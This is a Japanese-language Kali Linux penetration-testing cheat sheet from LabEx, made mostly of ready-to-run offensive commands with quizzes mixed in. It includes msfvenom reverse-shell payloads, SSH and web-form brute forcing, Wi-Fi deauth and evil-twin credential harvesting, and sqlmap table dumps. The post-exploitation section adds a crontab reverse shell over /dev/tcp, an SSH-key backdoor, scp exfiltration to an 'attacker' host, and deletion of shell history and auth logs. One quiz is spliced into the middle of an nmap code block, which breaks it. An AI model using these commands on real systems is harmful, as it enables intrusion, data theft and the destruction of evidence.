---
title: 'Kali Linux チートシート | LabEx'
description: 'この包括的なチートシートで Kali Linux のペネトレーションテストを学ぶ。セキュリティツール、倫理的ハッキング、脆弱性スキャン、エクスプロイト、サイバーセキュリティテストのクイックリファレンス。'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Kali Linux チートシート
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/ja/learn/kali">ハンズオンラボで Kali Linux を学ぶ</a>
</base-disclaimer-title>
<base-disclaimer-content>
ハンズオンラボと実世界のシナリオを通じて Kali Linux ペネトレーションテストを学びます。LabEx は、必須コマンド、ネットワークスキャン、脆弱性評価、パスワード攻撃、Web アプリケーションテスト、デジタルフォレンジックを網羅した包括的な Kali Linux コースを提供します。倫理的ハッキング技術とセキュリティ監査ツールを習得しましょう。
</base-disclaimer-content>
</base-disclaimer>

## システム設定と構成

### 初期設定：`sudo apt update`

システムパッケージとリポジトリを更新し、最適なパフォーマンスを実現します。

```bash
# パッケージリポジトリの更新
sudo apt update
# インストール済みパッケージのアップグレード
sudo apt upgrade
# 完全なシステムアップグレード
sudo apt full-upgrade
# 必須ツールのインストール
sudo apt install curl wget git
```

### ユーザー管理：`sudo useradd`

セキュリティテスト用のユーザーアカウントを作成および管理します。

```bash
# 新規ユーザーの追加
sudo useradd -m username
# パスワードの設定
sudo passwd username
# ユーザーを sudo グループに追加
sudo usermod -aG sudo username
# ユーザーの切り替え
su - username
```

### サービス管理：`systemctl`

テストシナリオのためにシステムサービスとデーモンを制御します。

```bash
# サービスの開始
sudo systemctl start apache2
# サービスの停止
sudo systemctl stop apache2
# ブート時の有効化
sudo systemctl enable ssh
# サービスステータスの確認
sudo systemctl status postgresql
```

### ネットワーク設定：`ifconfig`

ペネトレーションテストのためにネットワークインターフェースを設定します。

```bash
# ネットワークインターフェースの表示
ifconfig
# IPアドレスの設定
sudo ifconfig eth0 192.168.1.100
# インターフェースのアップ/ダウン設定
sudo ifconfig eth0 up
# ワイヤレスインターフェースの設定
sudo ifconfig wlan0 up
```

### 環境変数：`export`

テスト環境変数とパスを設定します。

```bash
# ターゲットIPの設定
export TARGET=192.168.1.1
# ワードリストパスの設定
export WORDLIST=/usr/share/wordlists/rockyou.txt
# 環境変数の表示
env | grep TARGET
```

<BaseQuiz id="kali-env-1" correct="C">
  <template #question>
    `export` を使用して設定された環境変数はどうなりますか？
  </template>
  
  <BaseQuizOption value="A">システム再起動後も永続化する</BaseQuizOption>
  <BaseQuizOption value="B">現在のファイルでのみ利用可能</BaseQuizOption>
  <BaseQuizOption value="C" correct>現在のシェルとその子プロセスで利用可能</BaseQuizOption>
  <BaseQuizOption value="D">グローバルなシステム変数である</BaseQuizOption>
  
  <BaseQuizAnswer>
    `export` で設定された環境変数は、現在のシェルセッションとそのセッションから起動されたすべての子プロセスで利用可能になります。シェルセッションが終了すると失われますが、`.bashrc` などのシェル設定ファイルに追加すれば永続化できます。
  </BaseQuizAnswer>
</BaseQuiz>

### ツールのインストール：`apt install`

追加のセキュリティツールと依存関係をインストールします。

```bash
# 追加ツールのインストール
sudo apt install nmap wireshark burpsuite
# GitHubからのインストール
git clone https://github.com/tool/repo.git
# Pythonツールのインストール
pip3 install --user tool-name
```

## ネットワークの発見とスキャン

### ホストの発見：`nmap -sn`

ping スイープを使用してネットワーク上の稼働中のホストを特定します。

```bash
# Ping スイープ
nmap -sn 192.168.1.0/24
# ARP スキャン (ローカルネットワーク)
nmap -PR 192.168.1.0/24
# ICMP エコー スキャン
nmap -PE 192.168.1.0/24
# 高速ホスト発見
masscan --ping 192.168.1.0/24
```

### ポートスキャン：`nmap`

ターゲットシステム上の開いているポートと実行中のサービスをスキャンします。

```bash
# 基本的な TCP スキャン
nmap 192.168.1.1
# 積極的なスキャン
nmap -A 192.168.1.1
# UDP スキャン
nmap -sU 192.168.1.1
# ステルス SYN スキャン
nmap -sS 192.168.1.1
```

<BaseQuiz id="kali-nmap-1" correct="B">
  <template #question>
    `nmap -sS` は何を行いますか？
  </template>
  
  <BaseQuizOption value="A">UDP スキャンを実行する</BaseQuizOption>
  <BaseQuizOption value="B" correct>ステルス SYN スキャン (半開スキャン) を実行する</BaseQuizOption>
  <BaseQuizOption value="C">すべてのポートをスキャンする</BaseQuizOption>
  <BaseQuizOption value="D">OS 検出を実行する</BaseQuizOption>
  
  <BaseQuizAnswer>
    `-sS` フラグは、TCP ハンドシェイクを完了しないため、SYN スキャン（半開スキャンとも呼ばれる）を実行します。SYN パケットを送信し応答を分析することで、完全な TCP 接続スキャンよりもステルス性が高くなります。
  </BaseQuizAnswer>
</BaseQuiz>

### サービス列挙：`nmap -sV`

サービスバージョンと潜在的な脆弱性を特定します。

```bash
# バージョン検出
nmap -sV 192.168.1.1
# OS検出
nmap -O 192.168.1.1
```

<BaseQuiz id="kali-enumeration-1" correct="A">
  <template #question>
    `nmap -sV` は何を行いますか？
  </template>
  
  <BaseQuizOption value="A" correct>開いているポートで実行されているサービスバージョンを検出する</BaseQuizOption>
  <BaseQuizOption value="B">バージョン管理ポートのみをスキャンする</BaseQuizOption>
  <BaseQuizOption value="C">脆弱なサービスのみを表示する</BaseQuizOption>
  <BaseQuizOption value="D">OS 検出のみを実行する</BaseQuizOption>
  
  <BaseQuizAnswer>
    `-sV` フラグはバージョン検出を有効にし、開いているポートをプローブして実行されているサービスとバージョンを特定します。これは特定のソフトウェアバージョンに関連する潜在的な脆弱性を特定するのに役立ちます。
  </BaseQuizAnswer>
</BaseQuiz>
# スクリプトスキャン
nmap -sC 192.168.1.1
# 総合スキャン
nmap -sS -sV -O -A 192.168.1.1
```

## 情報収集と偵察

### DNS 列挙: `dig`

DNS 情報を収集し、ゾーン転送を実行します。

```bash
# 基本的な DNS ルックアップ
dig example.com
# 逆引き DNS ルックアップ
dig -x 192.168.1.1
# ゾーン転送の試行
dig @ns1.example.com example.com axfr
# DNS 列挙
dnsrecon -d example.com
```

### Web 偵察: `dirb`

Web サーバー上の隠されたディレクトリとファイルを検出します。

```bash
# ディレクトリ総当たり攻撃
dirb http://192.168.1.1
# カスタムワードリスト
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Gobuster の代替
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### WHOIS 情報: `whois`

ドメイン登録および所有者情報を収集します。

```bash
# WHOIS ルックアップ
whois example.com
# IP WHOIS
whois 8.8.8.8
# 総合情報収集
theharvester -d example.com -l 100 -b google
```

### SSL/TLS 分析: `sslscan`

SSL/TLS の設定と脆弱性を分析します。

```bash
# SSL スキャン
sslscan 192.168.1.1:443
# Testssl による総合分析
testssl.sh https://example.com
# SSL 証明書情報
openssl s_client -connect example.com:443
```

### SMB 列挙: `enum4linux`

SMB 共有と NetBIOS 情報を列挙します。

```bash
# SMB 列挙
enum4linux 192.168.1.1
# SMB 共有の一覧表示
smbclient -L //192.168.1.1
# 共有への接続
smbclient //192.168.1.1/share
# SMB 脆弱性スキャン
nmap --script smb-vuln* 192.168.1.1
```

### SNMP 列挙: `snmpwalk`

SNMP プロトコルを介してシステム情報を収集します。

```bash
# SNMP ウォーク
snmpwalk -c public -v1 192.168.1.1
# SNMP チェック
onesixtyone -c community.txt 192.168.1.1
# SNMP 列挙
snmp-check 192.168.1.1
```

## 脆弱性分析とエクスプロイト

### 脆弱性スキャン: `nessus`

自動化されたスキャナーを使用してセキュリティ脆弱性を特定します。

```bash
# Nessus サービスの開始
sudo systemctl start nessusd
# OpenVAS スキャン
openvas-start
# Nikto Web 脆弱性スキャナー
nikto -h http://192.168.1.1
# SQL インジェクションのための SQLmap
sqlmap -u "http://example.com/page.php?id=1"
```

### Metasploit Framework: `msfconsole`

エクスプロイトを起動し、ペネトレーションテストキャンペーンを管理します。

```bash
# Metasploit の開始
msfconsole
# エクスプロイトの検索
search ms17-010
# エクスプロイトの使用
use exploit/windows/smb/ms17_010_eternalblue
# ターゲットの設定
set RHOSTS 192.168.1.1
```

### バッファオーバーフローテスト: `pattern_create`

バッファオーバーフローエクスプロイトのためにパターンを生成します。

```bash
# パターンの生成
pattern_create.rb -l 400
# オフセットの検索
pattern_offset.rb -l 400 -q EIP_value
```

### カスタムエクスプロイト開発: `msfvenom`

特定のターゲット向けにカスタムペイロードを作成します。

```bash
# シェルコードの生成
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Windows リバースシェル
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Linux リバースシェル
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## パスワード攻撃と認証情報テスト

### 総当たり攻撃: `hydra`

さまざまなサービスに対してログイン総当たり攻撃を実行します。

```bash
# SSH 総当たり攻撃
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# HTTP フォーム総当たり攻撃
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# FTP 総当たり攻撃
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### ハッシュクラッキング: `hashcat`

GPU アクセラレーションを使用してパスワードハッシュをクラックします。

```bash
# MD5 ハッシュクラッキング
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# NTLM ハッシュクラッキング
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# ワードリストのバリエーション生成
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper: `john`

さまざまな攻撃モードによる従来のパスワードクラッキング。

```bash
# パスワードファイルのクラッキング
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# クラックされたパスワードの表示
john --show shadow.txt
# 増分モード
john --incremental shadow.txt
# カスタムルール
john --rules --wordlist=passwords.txt shadow.txt
```

### ワードリスト生成: `crunch`

ターゲットを絞った攻撃のためにカスタムワードリストを作成します。

```bash
# 4～8 文字のワードリストを生成
crunch 4 8 -o wordlist.txt
# カスタム文字セット
crunch 6 6 -t admin@ -o passwords.txt
# パターンベースの生成
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## ワイヤレスネットワークセキュリティテスト

### モニターモード設定: `airmon-ng`

パケットキャプチャとインジェクションのためにワイヤレスアダプターを設定します。

```bash
# モニターモードの有効化
sudo airmon-ng start wlan0
# 干渉プロセスの確認
sudo airmon-ng check kill
# モニターモードの停止
sudo airmon-ng stop wlan0mon
```

### ネットワークの発見: `airodump-ng`

ワイヤレスネットワークとクライアントを検出および監視します。

```bash
# すべてのネットワークのスキャン
sudo airodump-ng wlan0mon
# 特定のネットワークをターゲットにする
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# WEP ネットワークのみを表示
sudo airodump-ng --encrypt WEP wlan0mon
```

### WPA/WPA2 攻撃: `aircrack-ng`

WPA/WPA2 暗号化されたネットワークに対して攻撃を実行します。

```bash
# Deauth 攻撃
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# キャプチャされたハンドシェイクのクラッキング
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# Reaver による WPS 攻撃
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Evil Twin 攻撃: `hostapd`

認証情報ハーベスティングのために不正なアクセスポイントを作成します。

```bash
# 不正 AP の開始
sudo hostapd hostapd.conf
# DHCP サービス
sudo dnsmasq -C dnsmasq.conf
# 認証情報のキャプチャ
ettercap -T -M arp:remote /192.168.1.0/24//
```

## Web アプリケーションセキュリティテスト

### SQL インジェクションテスト: `sqlmap`

SQL インジェクションの検出とエクスプロイトを自動化します。

```bash
# 基本的な SQL インジェクションテスト
sqlmap -u "http://example.com/page.php?id=1"
# POST パラメータのテスト
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# データベースの抽出
sqlmap -u "http://example.com/page.php?id=1" --dbs
# 特定のテーブルのダンプ
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### クロスサイトスクリプティング: `xsser`

Web アプリケーションの XSS 脆弱性をテストします。

```bash
# XSS テスト
xsser --url "http://example.com/search.php?q=XSS"
# 自動 XSS 検出
xsser -u "http://example.com" --crawl=10
# カスタムペイロード
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Burp Suite 統合: `burpsuite`

Web アプリケーションセキュリティテストのための包括的なプラットフォーム。

```bash
# Burp Suite の開始
burpsuite
# プロキシの設定 (127.0.0.1:8080)
# トラフィックキャプチャのためにブラウザのプロキシを設定
# 自動化された攻撃のために Intruder を使用
# コンテンツ検出のために Spider を使用
```

### ディレクトリトラバーサル: `wfuzz`

ディレクトリトラバーサルおよびファイルインクルージョン脆弱性をテストします。

```bash
# ディレクトリのファジング
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# パラメータのファジング
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## 侵入後の活動と権限昇格

### システム列挙: `linpeas`

Linux システムの権限昇格のための自動化された列挙ツール。

```bash
# LinPEAS のダウンロード
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# 実行権限の付与
chmod +x linpeas.sh
# 列挙の実行
./linpeas.sh
# Windows の代替：winPEAS.exe
```

### 永続化メカニズム: `crontab`

侵害されたシステムで永続性を確立します。

```bash
# Crontab の編集
crontab -e
# リバースシェルの追加
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# SSH キーの永続化
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### データ流出: `scp`

侵害されたシステムから安全にデータを転送します。

```bash
# ファイルを攻撃者マシンにコピー
scp file.txt user@192.168.1.100:/tmp/
# 圧縮して転送
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# HTTP による流出
python3 -m http.server 8000
```

### 痕跡の隠蔽: `history`

侵害されたシステム上での活動の証拠を消去します。

```bash
# bash 履歴の消去
history -c
unset HISTFILE
# 特定のエントリの消去
history -d line_number
# システムログの消去
sudo rm /var/log/auth.log*
```

## デジタルフォレンジックと分析

### ディスクイメージング: `dd`

ストレージデバイスのフォレンジックイメージを作成します。

```bash
# ディスクイメージの作成
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# イメージの整合性検証
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# イメージのマウント
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### ファイル復元: `foremost`

ディスクイメージまたはドライブから削除されたファイルを復元します。

```bash
# イメージからのファイル復元
foremost -i evidence.img -o recovered/
# 特定のファイルタイプ
foremost -t jpg,png,pdf -i evidence.img -o photos/
# PhotoRec の代替
photorec evidence.img
```

### メモリ分析: `volatility`

フォレンジック証拠のために RAM ダンプを分析します。

```bash
# OS プロファイルの識別
volatility -f memory.dump imageinfo
# プロセスのリスト表示
volatility -f memory.dump --profile=Win7SP1x64 pslist
# プロセスの抽出
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### ネットワークパケット分析: `wireshark`

フォレンジック証拠のためにネットワークトラフィックキャプチャを分析します。

```bash
# Wireshark の開始
wireshark
# コマンドライン分析
tshark -r capture.pcap -Y "http.request.method==GET"
# ファイルの抽出
foremost -i capture.pcap -o extracted/
```

## レポート生成とドキュメント作成

### スクリーンショットキャプチャ: `gnome-screenshot`

体系的なスクリーンショットキャプチャにより、調査結果を文書化します。

```bash
# フルスクリーンショット
gnome-screenshot -f screenshot.png
# ウィンドウのキャプチャ
gnome-screenshot -w -f window.png
# 遅延キャプチャ
gnome-screenshot -d 5 -f delayed.png
# 領域選択
gnome-screenshot -a -f area.png
```

### ログ管理: `script`

ドキュメント作成のためにターミナルセッションを記録します。

```bash
# 記録セッションの開始
script session.log
# タイミング付きの記録
script -T session.time session.log
# セッションの再生
scriptreplay session.time session.log
```

### レポートテンプレート: `reportlab`

プロフェッショナルなペネトレーションテストレポートを生成します。

```bash
# レポートツールのインストール
pip3 install reportlab
# PDF レポートの生成
python3 generate_report.py
# Markdown から PDF へ
pandoc report.md -o report.pdf
```

### 証拠の整合性: `sha256sum`

暗号学的ハッシュを使用して証拠の連鎖を維持します。

```bash
# チェックサムの生成
sha256sum evidence.img > evidence.sha256
# 整合性の検証
sha256sum -c evidence.sha256
# 複数ファイルのチェックサム
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## システムメンテナンスと最適化

### パッケージ管理: `apt`

システムパッケージとセキュリティツールのメンテナンスと更新を行います。

```bash
# パッケージリストの更新
sudo apt update
# すべてのパッケージのアップグレード
sudo apt upgrade
# 特定のツールのインストール
sudo apt install tool-name
# 不要なパッケージの削除
sudo apt autoremove
```

### カーネルアップデート: `uname`

セキュリティパッチのためにシステムカーネルを監視および更新します。

```bash
# 現在のカーネルの確認
uname -r
# アップグレード可能なカーネルの一覧表示
apt list --upgradable | grep linux-image
# 新しいカーネルのインストール
sudo apt install linux-image-generic
# 古いカーネルの削除
sudo apt autoremove --purge
```

### ツール検証: `which`

ツールのインストールを確認し、実行可能ファイルの場所を特定します。

```bash
# ツールの場所の特定
which nmap
# ツールの存在確認
command -v metasploit
# ディレクトリ内のすべてのツールのリスト表示
ls /usr/bin/ | grep -i security
```

### リソース監視: `htop`

集中的なセキュリティテスト中にシステムリソースを監視します。

```bash
# 対話型プロセスビューア
htop
# メモリ使用量
free -h
# ディスク使用量
df -h
# ネットワーク接続
netstat -tulnp
```

## 必須の Kali Linux ショートカットとエイリアス

### エイリアスの作成: `.bashrc`

頻繁に使用するタスクのために時間節約のコマンドショートカットを設定します。

```bash
# bashrc の編集
nano ~/.bashrc
# 便利なエイリアスの追加
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# bashrc の再読み込み
source ~/.bashrc
```

### カスタム関数: `function`

一般的なワークフローのために高度なコマンドの組み合わせを作成します。

```bash
# クイック nmap スキャン関数
function qscan() {
    nmap -sS -sV -O $1
}
# エンゲージメントのためのディレクトリ設定
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### キーボードショートカット: ターミナル

より高速なナビゲーションのために必須のキーボードショートカットを習得します。

```bash
# ターミナルショートカット
# Ctrl+C - 現在のコマンドを終了
# Ctrl+Z - 現在のコマンドを一時停止
# Ctrl+L - 画面をクリア
# Ctrl+R - コマンド履歴の検索
# Tab - コマンドの自動補完
# 上/下 - コマンド履歴の移動
```

### 環境設定: `tmux`

長時間実行されるタスクのために永続的なターミナルセッションを設定します。

```bash
# 新しいセッションの開始
tmux new-session -s pentest
# セッションのデタッチ
# Ctrl+B, D
# セッションの一覧表示
tmux list-sessions
# セッションへのアタッチ
tmux attach -t pentest
```

## 関連リンク

- <router-link to="/linux">Linux チートシート</router-link>
- <router-link to="/shell">Shell チートシート</router-link>
- <router-link to="/cybersecurity">サイバーセキュリティ チートシート</router-link>
- <router-link to="/nmap">Nmap チートシート</router-link>
- <router-link to="/wireshark">Wireshark チートシート</router-link>
- <router-link to="/hydra">Hydra チートシート</router-link>
- <router-link to="/devops">DevOps チートシート</router-link>
- <router-link to="/docker">Docker チートシート</router-link>
